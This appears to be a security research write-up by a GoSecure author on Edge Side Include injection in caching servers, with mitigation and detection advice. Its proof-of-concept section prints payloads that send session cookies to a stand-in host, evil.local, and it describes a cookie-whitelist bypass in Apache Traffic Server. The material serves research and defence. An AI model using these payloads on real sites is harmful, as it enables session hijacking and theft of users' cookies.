# Edge Side Include Injection: Abusing Caching Servers for SSRF and Transparent Session Hijacking

**By Louis Dion-Marcil, GoSecure**

## What is Edge Side Includes (ESI)?

Edge Side Includes (ESI) is a markup language that allows web pages to be assembled from fragments. This technology is often used in content delivery networks (CDNs) and caching servers to improve performance by breaking down a page into smaller, cacheable parts.

### The Weather Website Example

Consider a weather website with the following forecast:

| Day       | Temperature |
|-----------|-------------|
| Monday    | 27°C        |
| Tuesday   | 23°C        |
| Wednesday | 31°C        |

In this example, the temperature data can be dynamically included using ESI, allowing different parts of the page to be cached separately.

## How ESI Works

- **Fragmentation**: ESI adds fragmentation to caching, enabling parts of a page to be updated independently.
- **App Server Markers**: The application server sends fragment markers in HTTP responses.
- **Parsing by Surrogate**: ESI tags are parsed by the HTTP surrogate (e.g., load balancer, proxy).
- **HTTP Headers**: Most ESI engines require specific HTTP headers from the application server.

### ESI Features & Syntax

#### Include
```html
<!-- page-1.html -->
This is page 1!
<esi:include src="page-2.html" />

<!-- page-2.html -->
This is page 2!
```

When accessed:
```bash
$ curl -s http://esi/page-1.html
This is page 1!
This is page 2!
```

#### Variables
ESI supports variables, which can be used to include dynamic content:
- `$(VARIABLE_NAME)`
- `$(HTTP_USER_AGENT)`
- `$(QUERY_STRING)`
- `$(HTTP_COOKIE)`

### ESI Flow (Cache Miss)

1. `/1.html` is requested.
2. The response includes ESI tags.
3. The ESI tags are processed.
4. Additional requests are made to fetch the included fragments.
5. The final response is assembled and sent to the client.

### ESI Attacks

- **Legitimacy Check**: The edge server cannot distinguish between legitimate and malicious ESI tags.
- **Injection**: An attacker can inject ESI tags to leak sensitive information, such as cookies.

#### Example
```html
City: $(HTTP_COOKIE{PHPSESSID})
```

### ESI Implementations

#### Apache Traffic Server
- **Donated by Yahoo!**
- **Features**: Cookie whitelisting, critical cookies not accessible by ESI.
- **Bypass**: Using `$(HTTP_HEADER{Cookie})` can bypass some restrictions.

#### Oracle Web Cache (for WebLogic)
- **Part of 11g suite**
- **Serves WebLogic Application Servers**
- **Features**: Initial ESI specification plus additional features.

### Proof of Concept

#### Example 1
```html
<script>
  var x = new XMLHttpRequest();
  x.open("GET", "//evil.local/$(HTTP_COOKIE{session_cookie})");
  x.send();
</script>
```

#### Example 2
```html
<a href="//evil.local/$(HTTP_HEADER{Cookie})">Click me</a>
```

### Mitigations

- **Escaping and Encoding**: Properly escape and encode ESI tags to prevent injection.
- **Validation**: Validate and sanitize input to ensure only expected ESI tags are processed.

### SSRF with Apache Traffic Server

#### Flow
1. `/api/me` is requested.
2. The response includes ESI tags.
3. Additional requests are made to fetch the included fragments.
4. The final response is assembled and sent to the client.

### Detection

- **Manual Detection**: Test for ESI processing by injecting tags and observing the response.
- **Automatic Detection**: Use tools like Burp ActiveScan++, Burp Upload Scanner, and Acunetix.

### Migration

- **Cloudflare Workers**: Consider using Cloudflare Workers for more secure and flexible edge processing.
- **Example**: [Cloudflare Workers Gist](https://gist.github.com/Overbryd/c070bb1fa769609d404f648cd506340f)

### Further Reading

For a detailed blog post on our prior research, see: [Beyond XSS: Edge Side Include Injection](https://gosecure.net/2018/04/03/beyond-xss-edge-side-include-injection/)

**Questions?**

**Louis Dion-Marcil, GoSecure**